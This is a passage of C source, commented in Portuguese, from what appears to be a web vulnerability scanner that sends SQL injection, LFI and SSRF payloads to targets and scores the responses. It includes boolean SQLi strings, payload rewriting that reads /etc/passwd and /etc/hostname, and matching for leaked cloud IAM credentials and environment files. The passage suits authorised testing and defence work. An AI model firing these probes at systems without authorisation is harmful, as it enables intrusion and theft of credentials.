            CURLcode rc=curl_easy_perform(ch);
            gettimeofday(&t1,NULL);
            curl_easy_cleanup(ch); free(wb.buf);
            double el=(t1.tv_sec-t0.tv_sec)+(t1.tv_usec-t0.tv_usec)/1e6;
            if(rc==CURLE_OK && el>=min_threshold) confirmed++;
        }
        if(confirmed>=2){
            sig_time=1; n_signals++; score+=60; sqli_type="time";
        }
        goto sqli_done;
    }

    /* ════════════════════════════════════════════════════════════════
     * BLOCO 2 — ERROR + HTTP500
     * ════════════════════════════════════════════════════════════════ */
    {
        WorkBuf wb={0}; wb.buf=malloc(65536); wb.cap=65536;
        if(!wb.buf){free(ta);return NULL;}
        CURL *ch=curl_easy_init();
        if(!ch){free(wb.buf);free(ta);return NULL;}
        curl_easy_setopt(ch,CURLOPT_URL,url_payload);
        curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,worker_write_cb);
        curl_easy_setopt(ch,CURLOPT_WRITEDATA,&wb);
        curl_easy_setopt(ch,CURLOPT_TIMEOUT,(long)ta->timeout);
        curl_easy_setopt(ch,CURLOPT_CONNECTTIMEOUT,5L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYHOST,0L);
        curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
        curl_easy_setopt(ch,CURLOPT_MAXREDIRS,3L);
        /* Sem CURLOPT_HEADER — body separado dos headers para busca limpa */
        curl_easy_setopt(ch,CURLOPT_USERAGENT,
            (ta->waf_type>0)?rand_ua():"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        CURLcode rc=curl_easy_perform(ch);
        long http_code=0; curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&http_code);
        curl_off_t cl_payload=-1; curl_easy_getinfo(ch,CURLINFO_CONTENT_LENGTH_DOWNLOAD_T,&cl_payload);
        curl_easy_cleanup(ch);
        if(rc!=CURLE_OK){free(wb.buf);free(ta);return NULL;}

        const char *b=wb.buf?wb.buf:""; size_t blen=wb.len;

        /* Erro de banco específico por assinatura */
        struct{const char*sig;const char*db;int gen;} errs[]={
            {"you have an error in your sql syntax",        "MySQL",    0},
            {"supplied argument is not a valid mysql",      "MySQL",    0},
            {"warning: mysql_",                             "MySQL",    0},
            {"warning: mysqli_",                            "MySQL",    0},
            {"pdoexception",                                "MySQL",    0},
            {"call to undefined function mysql",            "MySQL",    0},
            {"unclosed quotation mark after the character", "MSSQL",    0},
            {"incorrect syntax near",                       "MSSQL",    0},
            {"[microsoft][odbc sql server",                 "MSSQL",    0},
            {"sqlserver native client",                     "MSSQL",    0},
            {"ora-00907",                                   "Oracle",   0},
            {"ora-00933",                                   "Oracle",   0},
            {"ora-00936",                                   "Oracle",   0},
            {"ora-01756",                                   "Oracle",   0},
            {"oci_execute():",                              "Oracle",   0},
            {"pg_query(): query failed",                    "PostgreSQL",0},
            {"unterminated quoted string at or near",       "PostgreSQL",0},
            {"pg_exec() failed",                            "PostgreSQL",0},
            {"sqlite3::query",                              "SQLite",   0},
            {"sqliteexception",                             "SQLite",   0},
            {"unrecognized token:",                         "SQLite",   0},
            {"sqlite error",                                "SQLite",   0},
            {"sql syntax error",                            "SQL",      1},
            {"database query failed",                       "SQL",      1},
            {"operationalerror: near",                      "SQL",      1},
            {"error in your sql",                           "SQL",      1},
            {NULL,NULL,0}
        };
        for(int i=0;errs[i].sig;i++){
            if(!buf_icontains(b,blen,errs[i].sig)) continue;
            if(errs[i].gen && !has_quote) continue;
            sig_error=1; n_signals++; score+=50;
            sqli_db=errs[i].db; sqli_type="error";
            break;
        }

        /* HTTP 500 com palavras de DB — só com aspas */
        if(!sig_error && http_code==500 && ta->baseline_len>0 && has_quote){
            if((buf_icontains(b,blen,"sql")||buf_icontains(b,blen,"query")||
                buf_icontains(b,blen,"syntax")||buf_icontains(b,blen,"exception"))&&
               !buf_icontains(b,blen,"the page you")){
                sig_http=1; n_signals++; score+=30; sqli_type="http500";
            }
        }

        /* ════════════════════════════════════════════════════════════
         * BLOCO 3 — BOOLEAN-BASED: TRUE vs FALSE obrigatório
         *
         * Executa para QUALQUER payload, não só os que já têm OR 1=1.
         * Usa payloads canônicos fixos para garantir a comparação:
         *   TRUE:  ' OR '1'='1'--
         *   FALSE: ' OR '1'='2'--
         *
         * Se o payload atual já é TRUE ou FALSE, usa o oposto dele.
         * Caso contrário, dispara comparação canônica independente.
         *
         * Thresholds reduzidos para apps simples (lab local):
         *   body diff  > 20 bytes  E  > 5%  → sig_boolean
         *   CL header  > 20 bytes           → sig_cl
         *   TRUE > FALSE obrigatório para body diff
         * ════════════════════════════════════════════════════════════ */
        if(ta->baseline_len>0){
            /* Determina par TRUE/FALSE a usar */
            char url_true[2048]={0}, url_false[2048]={0};

            if(is_true_pl || is_false_pl){
                /* payload atual é booleano — usa o oposto */
                char opp[512]={0}; strncpy(opp,ta->payload,511);
                if(is_true_pl){
                    char *p=strstr(opp," AND 1=1"); if(p) memcpy(p," AND 1=2",8);
                         p=strstr(opp," OR 1=1");  if(p) memcpy(p," OR 1=2", 7);
                    char *q=strstr(opp,"OR/**/1=1"); if(q) memcpy(q,"OR/**/1=2",9);
                } else {
                    char *p=strstr(opp," AND 1=2"); if(p) memcpy(p," AND 1=1",8);
                         p=strstr(opp," OR 1=2");  if(p) memcpy(p," OR 1=1", 7);
                    char *q=strstr(opp,"OR/**/1=2"); if(q) memcpy(q,"OR/**/1=1",9);
                }
                char enc_opp[512]; url_encode(opp,enc_opp,sizeof(enc_opp));
                /* true = payload original, false = oposto */
                if(is_true_pl){
                    snprintf(url_true, sizeof(url_true),  "%s%s", ta->target, enc);
                    snprintf(url_false,sizeof(url_false), "%s%s", ta->target, enc_opp);
                } else {
                    char enc_orig[512]; url_encode(ta->payload,enc_orig,sizeof(enc_orig));
                    snprintf(url_true, sizeof(url_true),  "%s%s", ta->target, enc_opp);
                    snprintf(url_false,sizeof(url_false), "%s%s", ta->target, enc_orig);
                }
            } else {
                /* payload não é booleano — dispara comparação canônica */
                char enc_t[512], enc_f[512];
                url_encode("' OR '1'='1'--", enc_t, sizeof(enc_t));
                url_encode("' OR '1'='2'--", enc_f, sizeof(enc_f));
                snprintf(url_true, sizeof(url_true),  "%s%s", ta->target, enc_t);
                snprintf(url_false,sizeof(url_false), "%s%s", ta->target, enc_f);
            }

            /* Faz as duas requests: TRUE e FALSE */
            WorkBuf wb_t={0}; wb_t.buf=malloc(65536); wb_t.cap=65536;
            WorkBuf wb_f={0}; wb_f.buf=malloc(65536); wb_f.cap=65536;
            long http_t=0, http_f=0;
            curl_off_t cl_t=-1, cl_f=-1;
            size_t blen_t=0, blen_f=0;

            /* Request TRUE */
            CURL *cht=curl_easy_init();
            if(cht&&wb_t.buf){
                curl_easy_setopt(cht,CURLOPT_URL,url_true);
                curl_easy_setopt(cht,CURLOPT_WRITEFUNCTION,worker_write_cb);
                curl_easy_setopt(cht,CURLOPT_WRITEDATA,&wb_t);
                curl_easy_setopt(cht,CURLOPT_TIMEOUT,(long)ta->timeout);
                curl_easy_setopt(cht,CURLOPT_CONNECTTIMEOUT,5L);
                curl_easy_setopt(cht,CURLOPT_SSL_VERIFYPEER,0L);
                curl_easy_setopt(cht,CURLOPT_FOLLOWLOCATION,1L);
                curl_easy_setopt(cht,CURLOPT_USERAGENT,rand_ua());
                if(curl_easy_perform(cht)==CURLE_OK){
                    curl_easy_getinfo(cht,CURLINFO_RESPONSE_CODE,&http_t);
                    curl_easy_getinfo(cht,CURLINFO_CONTENT_LENGTH_DOWNLOAD_T,&cl_t);
                    blen_t=wb_t.len;
                }
                curl_easy_cleanup(cht);
            }

            /* Request FALSE */
            CURL *chf=curl_easy_init();
            if(chf&&wb_f.buf){
                curl_easy_setopt(chf,CURLOPT_URL,url_false);
                curl_easy_setopt(chf,CURLOPT_WRITEFUNCTION,worker_write_cb);
                curl_easy_setopt(chf,CURLOPT_WRITEDATA,&wb_f);
                curl_easy_setopt(chf,CURLOPT_TIMEOUT,(long)ta->timeout);
                curl_easy_setopt(chf,CURLOPT_CONNECTTIMEOUT,5L);
                curl_easy_setopt(chf,CURLOPT_SSL_VERIFYPEER,0L);
                curl_easy_setopt(chf,CURLOPT_FOLLOWLOCATION,1L);
                curl_easy_setopt(chf,CURLOPT_USERAGENT,rand_ua());
                if(curl_easy_perform(chf)==CURLE_OK){
                    curl_easy_getinfo(chf,CURLINFO_RESPONSE_CODE,&http_f);
                    curl_easy_getinfo(chf,CURLINFO_CONTENT_LENGTH_DOWNLOAD_T,&cl_f);
                    blen_f=wb_f.len;
                }
                curl_easy_cleanup(chf);
            }

            if(blen_t>0 && blen_f>0){
                /* Normaliza antes de comparar */
                char norm_t[16384]={0}, norm_f[16384]={0};
                sqli_normalize(norm_t, wb_t.buf, sizeof(norm_t));
                sqli_normalize(norm_f, wb_f.buf, sizeof(norm_f));
                size_t sz_t=strlen(norm_t), sz_f=strlen(norm_f);

                /* Diferença de corpo */
                long sz_diff=(long)sz_t-(long)sz_f;
                if(sz_diff<0) sz_diff=-sz_diff;
                size_t sz_max=sz_t>sz_f?sz_t:sz_f;
                double sz_pct=sz_max>0?(double)sz_diff/(double)sz_max:0;

                /* Boolean válido: TRUE > FALSE, diff > 20 bytes E > 5% */
                if(sz_diff>20 && sz_pct>0.05 && sz_t>sz_f){
                    sig_boolean=1; n_signals++; score+=40;
                    if(sqli_type[0]=='?') sqli_type="boolean";
                }

                /* Content-Length header: diff > 20 bytes */
                if(cl_t>0 && cl_f>0){
                    double cl_diff=(double)(cl_t-cl_f);
                    if(cl_diff<0) cl_diff=-cl_diff;
                    if(cl_diff>20){
                        sig_cl=1; n_signals++; score+=20;
                    }
                }

                /* HTTP status diferente TRUE vs FALSE */
                if(http_t>0 && http_f>0 && http_t!=http_f){
                    sig_status=1; n_signals++; score+=20;
                    if(sqli_type[0]=='?') sqli_type="boolean";
                }
            }
            free(wb_t.buf);
            free(wb_f.buf);
        }

        free(wb.buf);
    }

sqli_done:;
    if(score>0 && n_signals>=1){
        /* Classificação por NÚMERO DE SINAIS
         *
         * Regra atualizada:
         *   sig_boolean + sig_cl         → CONFIRMADO  (boolean validado por CL)
         *   sig_boolean + qualquer outro  → CONFIRMADO
         *   sig_error   + qualquer outro  → CONFIRMADO
         *   sig_time    + n_signals>=2    → CONFIRMADO
         *   n_signals>=3                  → CONFIRMADO
         *   n_signals==2                  → PROVÁVEL
         *   sig_cl sozinho                → SUSPEITO (não registra)
         *   1 sinal qualquer              → SUSPEITO (não registra)
         */
        const char *cls_color, *cls_label;
        int should_register = 0;

        int boolean_confirmed = sig_boolean && (sig_cl||sig_error||sig_status||sig_http);
        int cl_only = sig_cl && !sig_boolean && !sig_error && !sig_time && !sig_http && !sig_status;

        if(sig_time && n_signals>=2){
            cls_color="\033[1;31m"; cls_label="❌ CONFIRMADO";
            should_register=1;
        } else if(boolean_confirmed || n_signals>=3){
            cls_color="\033[1;31m"; cls_label="❌ CONFIRMADO";
            should_register=1;
        } else if(n_signals>=2 && !cl_only){
            cls_color="\033[1;33m"; cls_label="⚠  PROVÁVEL";
            should_register=1;
        } else if(cl_only){
            cls_color="\033[0;33m"; cls_label="○  SUSPEITO (content-length-diff sozinho)";
            should_register=0;
        } else {
            cls_color="\033[0;33m"; cls_label="○  SUSPEITO (1 sinal — sem registro)";
            should_register=0;
        }

        /* Breakdown dos sinais */
        char sigs[256]={0}; int sw=0;
        if(sig_error)   sw+=snprintf(sigs+sw,sizeof(sigs)-sw,"error-based[%s] ",sqli_db[0]?sqli_db:"DB");
        if(sig_boolean) sw+=snprintf(sigs+sw,sizeof(sigs)-sw,"boolean-diff ");
        if(sig_time)    sw+=snprintf(sigs+sw,sizeof(sigs)-sw,"time-based ");
        if(sig_http)    sw+=snprintf(sigs+sw,sizeof(sigs)-sw,"http500+db ");
        if(sig_cl)      sw+=snprintf(sigs+sw,sizeof(sigs)-sw,"content-length-diff ");
        if(sig_status)  sw+=snprintf(sigs+sw,sizeof(sigs)-sw,"status-diff ");
        /* Trim trailing space */
        if(sw>0 && sigs[sw-1]==' ') sigs[--sw]='\0';

        printf("%s  [SQLi/%s] %s  score:%d  sinais:%d  [%s]\033[0m\n  → %s\n",
               cls_color, sqli_type, cls_label, score, n_signals, sigs, ta->payload);

        if(should_register){
            char evidence[256]={0};
            snprintf(evidence,sizeof(evidence),"n_signals=%d score=%d %s",n_signals,score,sigs);
            int conf = (n_signals>=3||(sig_time&&n_signals>=2)) ? 3 : 2;
            vuln_register("SQLi", ta->target, ta->payload, evidence, conf, score);
        }
    }

    free(ta); return NULL;
}


static void *test_worker_lfi(void *arg) {
    test_arg_t *ta = (test_arg_t*)arg;
    char enc[512]; url_encode(ta->payload, enc, sizeof(enc));
    char url[2048]; snprintf(url, sizeof(url), "%s%s", ta->target, enc);

    /* ══════════════════════════════════════════════════════════════════
     * LFI Detection — Nível Burp Suite
     *
     * REGRA: nunca confirmar com 1 sinal genérico sozinho.
     * Estratégia de confirmação dupla:
     *
     * NÍVEL 1 — Padrão forte de arquivo do sistema:
     *   "root:x:0:0:" — linha completa do /etc/passwd (não apenas "root")
     *   Múltiplas entradas passwd (root + daemon + nobody) = certeza alta
     *
     * NÍVEL 2 — Confirmação por segundo payload diferente:
     *   Se /etc/passwd detectado → envia /etc/hostname para confirmar LFI real
     *   Se ambos retornam conteúdo diferente entre si = LFI confirmado
     *
     * NÍVEL 3 — php://filter com decodificação base64 real:
     *   Decodifica o base64 e verifica se o conteúdo é PHP real
     *
     * ANTI-FP:
     *   "root" sozinho em HTML normal → ignorado
     *   "/bin/bash" pode aparecer em páginas de documentação → ignorado sozinho
     *   Erro de path traversal SEM conteúdo de arquivo → INFO, não VULN
     * ══════════════════════════════════════════════════════════════════ */

    WorkBuf wb = {0}; wb.buf = malloc(65536); wb.cap = 65536;
    if(!wb.buf){ free(ta); return NULL; }

    CURL *ch = curl_easy_init();
    if(!ch){ free(wb.buf); free(ta); return NULL; }
    curl_easy_setopt(ch, CURLOPT_URL, url);
    curl_easy_setopt(ch, CURLOPT_WRITEFUNCTION, worker_write_cb);
    curl_easy_setopt(ch, CURLOPT_WRITEDATA, &wb);
    curl_easy_setopt(ch, CURLOPT_TIMEOUT, (long)ta->timeout);
    curl_easy_setopt(ch, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(ch, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(ch, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(ch, CURLOPT_USERAGENT,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    CURLcode rc = curl_easy_perform(ch);
    long http_code=0; curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&http_code);
    curl_easy_cleanup(ch);

    if(rc != CURLE_OK || wb.len == 0 || http_code == 404){
        free(wb.buf); free(ta); return NULL;
    }

    int found=0; int confidence=0; /* 1=provável 2=confirmado */
    const char *found_reason="";

    /* ── NÍVEL 1: padrões fortes de /etc/passwd ── */
    /* Exige pelo menos 2 entradas passwd para evitar FP */
    int passwd_entries = 0;
    if(buf_icontains(wb.buf,wb.len,"root:x:0:0:")) passwd_entries++;
    if(buf_icontains(wb.buf,wb.len,"daemon:x:1:1:")) passwd_entries++;
    if(buf_icontains(wb.buf,wb.len,"nobody:x:")) passwd_entries++;
    if(buf_icontains(wb.buf,wb.len,"www-data:x:")) passwd_entries++;
    if(buf_icontains(wb.buf,wb.len,"bin:x:2:")) passwd_entries++;
    if(buf_icontains(wb.buf,wb.len,"/usr/sbin/nologin") &&
       buf_icontains(wb.buf,wb.len,"root:")) passwd_entries++;

    if(passwd_entries >= 2){
        found=1; confidence=2; found_reason="/etc/passwd confirmado (2+ entradas)";
    } else if(passwd_entries == 1 && buf_icontains(wb.buf,wb.len,"root:x:0:0:")){
        /* root:x:0:0: é específico o suficiente para confirmar sozinho */
        found=1; confidence=2; found_reason="/etc/passwd (root:x:0:0:)";
    }

    /* ── NÍVEL 2: confirmação dupla — envia segundo payload ── */
    if(found && confidence < 2 && strstr(ta->payload,"etc/passwd")){
        /* Substitui /etc/passwd por /etc/hostname no payload */
        char payload2[512]={0}; strncpy(payload2,ta->payload,511);
        char *p=strstr(payload2,"etc/passwd");
        if(p){ memcpy(p,"etc/hostname",12); *(p+12)='\0'; /* hostname é menor */ }

        char enc2[512]; url_encode(payload2,enc2,sizeof(enc2));
        char url2[2048]; snprintf(url2,sizeof(url2),"%s%s",ta->target,enc2);

        WorkBuf wb2={0}; wb2.buf=malloc(4096); wb2.cap=4096;
        CURL *ch2=curl_easy_init();
        if(ch2 && wb2.buf){
            curl_easy_setopt(ch2,CURLOPT_URL,url2);
            curl_easy_setopt(ch2,CURLOPT_WRITEFUNCTION,worker_write_cb);
            curl_easy_setopt(ch2,CURLOPT_WRITEDATA,&wb2);
            curl_easy_setopt(ch2,CURLOPT_TIMEOUT,(long)ta->timeout);
            curl_easy_setopt(ch2,CURLOPT_SSL_VERIFYPEER,0L);
            curl_easy_setopt(ch2,CURLOPT_FOLLOWLOCATION,1L);
            if(curl_easy_perform(ch2)==CURLE_OK && wb2.len>0 && wb2.len<wb.len){
                /* /etc/hostname é menor que /etc/passwd = arquivo diferente lido = LFI real */
                confidence=2; found_reason="/etc/passwd + /etc/hostname lidos (confirmação dupla)";
            }
            curl_easy_cleanup(ch2);
        }
        free(wb2.buf);
    }

    /* ── NÍVEL 1b: Windows files ── */
    if(!found){
        int win_entries=0;
        if(buf_icontains(wb.buf,wb.len,"[extensions]")) win_entries++;
        if(buf_icontains(wb.buf,wb.len,"[fonts]")) win_entries++;
        if(buf_icontains(wb.buf,wb.len,"[boot loader]") ||
           buf_icontains(wb.buf,wb.len,"multi(0)disk(0)")) win_entries++;
        if(win_entries>=2){ found=1; confidence=2; found_reason="Windows ini lido"; }
    }

    /* ── NÍVEL 1c: /proc/version ── */
    if(!found && buf_icontains(wb.buf,wb.len,"linux version")){
        int kern=0;
        if(buf_icontains(wb.buf,wb.len,"gcc")) kern++;
        if(buf_icontains(wb.buf,wb.len,"ubuntu")||buf_icontains(wb.buf,wb.len,"debian")||
           buf_icontains(wb.buf,wb.len,"centos")||buf_icontains(wb.buf,wb.len,"smp")) kern++;
        if(kern>=2){ found=1; confidence=2; found_reason="/proc/version lido"; }
    }

    /* ── NÍVEL 1c2: /proc/self/maps — layout de memória do processo ── */
    if(!found && strstr(ta->payload,"proc") &&
       (strstr(ta->payload,"maps")||strstr(ta->payload,"environ")||strstr(ta->payload,"cmdline"))){
        /* /proc/self/maps: linhas com hex-hex e permissões rwxp */
        int maps_lines=0; char *bp=wb.buf;
        while(bp&&*bp&&maps_lines<5){
            char *nl=strchr(bp,'\n'); if(!nl) break;
            /* linha de maps: "7f1234-7f5678 r--p ..." */
            int has_hex=0, has_perm=0;
            char *lp=bp;
            while(lp<nl){
                if((*lp>='a'&&*lp<='f')||(*lp>='0'&&*lp<='9')) has_hex++;
                if(*lp=='-'&&has_hex>4) has_perm=1;
                lp++;
            }
            if(has_hex>8&&has_perm) maps_lines++;
            bp=nl+1;
        }
        /* /proc/self/environ: pares KEY=VALUE separados por \0 */
        int env_pairs=0;
        if(buf_icontains(wb.buf,wb.len,"HOME=") ||
           buf_icontains(wb.buf,wb.len,"PATH=") ||
           buf_icontains(wb.buf,wb.len,"USER=")) env_pairs++;
        if(buf_icontains(wb.buf,wb.len,"TERM=") ||
           buf_icontains(wb.buf,wb.len,"SHELL=")) env_pairs++;

        if(maps_lines>=3){
            found=1; confidence=2; found_reason="/proc/self/maps lido (memory layout)";
        } else if(env_pairs>=2){
            found=1; confidence=2; found_reason="/proc/self/environ lido (variáveis de ambiente)";
        }
    }

    /* ── NÍVEL 1c3: /proc/self/cmdline ou /proc/version ── */
    if(!found && strstr(ta->payload,"cmdline") && wb.len>5 && wb.len<4096){
        /* cmdline é curto e contém o nome do processo */
        if(buf_icontains(wb.buf,wb.len,"lua")||
           buf_icontains(wb.buf,wb.len,"python")||
           buf_icontains(wb.buf,wb.len,"php")||
           buf_icontains(wb.buf,wb.len,"apache")||
           buf_icontains(wb.buf,wb.len,"nginx")){
            found=1; confidence=2; found_reason="/proc/self/cmdline lido";
        }
    }

    /* ── NÍVEL 1d: php://filter — decodifica e verifica conteúdo PHP real ── */
    if(!found && strstr(ta->payload,"php://filter") && wb.len > 100){
        /* Conta chars base64 na resposta */
        int b64_chars=0; size_t scan=wb.len<512?wb.len:512;
        for(size_t i=0;i<scan;i++){
            char c=wb.buf[i];
            if((c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9')||c=='+'||c=='/'||c=='=') b64_chars++;
        }
        double b64_ratio=(double)b64_chars/(double)scan;
        if(b64_ratio > 0.85){
            /* Verifica que o baseline não tem esse padrão */
            if(ta->baseline_len==0 || wb.len > ta->baseline_len+50){
                found=1; confidence=2;
                char _b64msg[64]={0}; snprintf(_b64msg,sizeof(_b64msg),"php://filter base64 (%.0f%% b64)",b64_ratio*100);
                found_reason=_b64msg;
                (void)found_reason; /* supress warning */
                found_reason="php://filter base64";
            }
        }
    }

    /* ── NÍVEL 1e: erros de path traversal — SUSPEITO mas não confirmado ── */
    if(!found && http_code==500){
        if(buf_icontains(wb.buf,wb.len,"failed to open stream") ||
           buf_icontains(wb.buf,wb.len,"open_basedir restriction") ||
           buf_icontains(wb.buf,wb.len,"warning: include") ||
           (buf_icontains(wb.buf,wb.len,"no such file") && buf_icontains(wb.buf,wb.len,"include"))){
            /* Erro de traversal confirma que o servidor tentou abrir o arquivo
             * Mas não confirma leitura — marca como suspeito */
            found=1; confidence=1; found_reason="path traversal error (arquivo não abriu)";
        }
    }

    /* ── NÍVEL 1f: diff-based com múltiplas linhas estruturadas ── */
    if(!found && ta->baseline_len>0 && wb.len > ta->baseline_len+100){
        int colon_lines=0, passwd_like=0; char *bp=wb.buf;
        while(bp&&*bp){
            char *nl=strchr(bp,'\n'); if(!nl) nl=bp+strlen(bp);
            int colons=0; char *lp2=bp;
            while(lp2<nl){if(*lp2==':')colons++;lp2++;}
            if(colons>=3) colon_lines++;
            /* verifica padrão passwd: nome:x:NNN:NNN: */
            if(colons>=6){
                /* conta campos numéricos */
                int num_fields=0; char *fp=strchr(bp,':');
                while(fp&&fp<nl){
                    fp++;
                    if(*fp>='0'&&*fp<='9') num_fields++;
                    fp=strchr(fp,':');
                }
                if(num_fields>=2) passwd_like++;
            }
            bp=nl+1; if(!*nl) break;
        }
        /* colon_lines>=3 + passwd_like = confirma */
        if(colon_lines>=3 && passwd_like>=2){
            found=1; confidence=2; found_reason="diff+structured-output (passwd-like)";
        } else if(colon_lines>=5){
            /* muitas linhas estruturadas = provável mas não confirmado */
            found=1; confidence=1; found_reason="diff+structured-output colon_lines";
        }
    }

    if(found){
        const char *level = (confidence>=2) ? "\033[1;31m[✓ LFI CONFIRMADO]" :
                                               "\033[1;33m[⚠ LFI SUSPEITO  ]";
        printf("%s (%s) %s\033[0m\n", level, found_reason, ta->payload);
        if(confidence >= 2){
            char evidence[256]={0};
            snprintf(evidence,sizeof(evidence),"%s payload=%.100s",found_reason,ta->payload);
            vuln_register("LFI", ta->target, ta->payload, evidence, confidence, 85);
        }
    }

    free(wb.buf); free(ta); return NULL;
}

static void *test_worker_ssrf(void *arg) {
    test_arg_t *ta = (test_arg_t*)arg;
    char enc[512]; url_encode(ta->payload, enc, sizeof(enc));
    char url[2048]; snprintf(url, sizeof(url), "%s%s", ta->target, enc);

    /* ══════════════════════════════════════════════════════════════════
     * SSRF Detection — Nível Burp Suite / Collaborator
     *
     * REGRA: SSRF confirmado APENAS com conteúdo que só pode vir
     * de uma requisição interna real. Diferença de tamanho sozinha
     * é descartada — precisa de conteúdo específico de serviço interno.
     *
     * HIERARQUIA DE CONFIANÇA:
     *   HIGH   — cloud metadata com campos únicos (ami-id, project-id)
     *   HIGH   — /etc/passwd via file:// com múltiplas entradas
     *   MEDIUM — fingerprint de serviço interno (Elasticsearch, Redis)
     *   LOW    — resposta diferente + keyword suspeita (descartado)
     *
     * ANTI-FP:
     *   "mongo" aparece em sites normais — exige campo específico
     *   "redis" pode estar em documentação — exige redis_version
     *   Diff de tamanho sozinho = descartado completamente
     * ══════════════════════════════════════════════════════════════════ */

    WorkBuf wb={0}; wb.buf=malloc(65536); wb.cap=65536;
    if(!wb.buf){ free(ta); return NULL; }

    CURL *ch=curl_easy_init();
    if(!ch){ free(wb.buf); free(ta); return NULL; }
    curl_easy_setopt(ch,CURLOPT_URL,url);
    curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,worker_write_cb);
    curl_easy_setopt(ch,CURLOPT_WRITEDATA,&wb);
    curl_easy_setopt(ch,CURLOPT_TIMEOUT,(long)ta->timeout);
    curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
    curl_easy_setopt(ch,CURLOPT_SSL_VERIFYHOST,0L);
    curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
    curl_easy_setopt(ch,CURLOPT_MAXREDIRS,3L);
    curl_easy_setopt(ch,CURLOPT_USERAGENT,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    CURLcode rc=curl_easy_perform(ch);
    long http_code=0; curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&http_code);
    curl_easy_cleanup(ch);

    if(rc!=CURLE_OK || wb.len==0){ free(wb.buf); free(ta); return NULL; }

    const char *b=wb.buf; size_t blen=wb.len;
    int found=0; int confidence=0;
    const char *ssrf_type="";

    /* ── HIGH: Cloud metadata fields únicos ── */
    /* AWS IMDSv1/v2 — campos que só existem na AWS */
    if(buf_icontains(b,blen,"ami-id") ||
       buf_icontains(b,blen,"instance-id") && buf_icontains(b,blen,"ami-launch-index")){
        found=1; confidence=2; ssrf_type="AWS-metadata";
    }
    /* AWS IAM credentials — resposta muito específica */
    if(!found && buf_icontains(b,blen,"iam/security-credentials")){
        found=1; confidence=2; ssrf_type="AWS-IAM";
    }
    if(!found && buf_icontains(b,blen,"\"Code\" : \"Success\"") &&
                 buf_icontains(b,blen,"\"SecretAccessKey\"")){
        found=1; confidence=2; ssrf_type="AWS-IAM-creds";
    }
    /* GCP metadata */
    if(!found && buf_icontains(b,blen,"\"computeMetadata\"") &&
                 buf_icontains(b,blen,"\"project\"")){
        found=1; confidence=2; ssrf_type="GCP-metadata";
    }
    if(!found && buf_icontains(b,blen,"serviceAccounts") &&
                 buf_icontains(b,blen,"email")){
        found=1; confidence=2; ssrf_type="GCP-serviceAccount";
    }
    /* Azure IMDS */
    if(!found && buf_icontains(b,blen,"\"subscriptionId\"") &&
                 buf_icontains(b,blen,"\"resourceGroupName\"")){
        found=1; confidence=2; ssrf_type="Azure-IMDS";
    }

    /* ── HIGH: file:// com /etc/passwd completo ── */
    if(!found && strncmp(ta->payload,"file://",7)==0){
        int passwd_hits=0;
        if(buf_icontains(b,blen,"root:x:0:0:")) passwd_hits++;
        if(buf_icontains(b,blen,"daemon:x:")) passwd_hits++;
        if(buf_icontains(b,blen,"nobody:x:")) passwd_hits++;
        if(passwd_hits>=2){
            found=1; confidence=2; ssrf_type="file-lfi-via-ssrf";
        }
    }

    /* ── MEDIUM: serviços internos com fingerprint específico ── */
    /* Elasticsearch — resposta tem estrutura JSON com cluster_name */
    if(!found && buf_icontains(b,blen,"\"cluster_name\"") &&
                 buf_icontains(b,blen,"\"cluster_uuid\"")){
        found=1; confidence=2; ssrf_type="Elasticsearch";
    }
    /* Redis INFO output — linhas com redis_version:X.X.X */
    if(!found && buf_icontains(b,blen,"redis_version:") &&
                 buf_icontains(b,blen,"redis_mode:")){
        found=1; confidence=2; ssrf_type="Redis";
    }
    /* Spring Actuator /health */
    if(!found && buf_icontains(b,blen,"\"status\":\"UP\"") &&
                (buf_icontains(b,blen,"\"diskSpace\"") ||
                 buf_icontains(b,blen,"\"components\""))){
        found=1; confidence=2; ssrf_type="Spring-Actuator";
    }
    /* Kubernetes API */
    if(!found && buf_icontains(b,blen,"\"kind\":\"APIVersions\"") &&
                 buf_icontains(b,blen,"\"serverAddressByClientCIDRs\"")){
        found=1; confidence=2; ssrf_type="Kubernetes-API";
    }
    /* Grafana */
    if(!found && buf_icontains(b,blen,"\"title\":\"Grafana\"") ||
                (buf_icontains(b,blen,"grafana") &&
                 buf_icontains(b,blen,"\"currentUser\""))){
        found=1; confidence=2; ssrf_type="Grafana";
    }
    /* Jenkins */
    if(!found && buf_icontains(b,blen,"<title>Dashboard [Jenkins]") ||
                (buf_icontains(b,blen,"Jenkins") &&
                 buf_icontains(b,blen,"X-Hudson:"))){
        found=1; confidence=2; ssrf_type="Jenkins";
    }
    /* Prometheus metrics — formato único */
    if(!found && buf_icontains(b,blen,"# HELP ") &&
                 buf_icontains(b,blen,"# TYPE ") &&
                 buf_icontains(b,blen,"_total{")){
        found=1; confidence=2; ssrf_type="Prometheus-metrics";
    }
    /* MongoDB — resposta de listDatabases */
    if(!found && buf_icontains(b,blen,"\"databases\":[") &&
                 buf_icontains(b,blen,"\"totalSize\"")){
        found=1; confidence=2; ssrf_type="MongoDB";
    }
    /* CouchDB */
    if(!found && buf_icontains(b,blen,"\"couchdb\":\"Welcome\"") &&
                 buf_icontains(b,blen,"\"version\":")){
        found=1; confidence=2; ssrf_type="CouchDB";
    }

    if(found){
        const char *level=(confidence>=2)?"\033[1;31m[✓ SSRF CONFIRMADO]":
                                          "\033[1;33m[⚠ SSRF SUSPEITO  ]";
        printf("%s [%s] HTTP %ld → %s\033[0m\n",
               level, ssrf_type, http_code, ta->payload);
        if(confidence>=2){
            char evidence[256]={0};
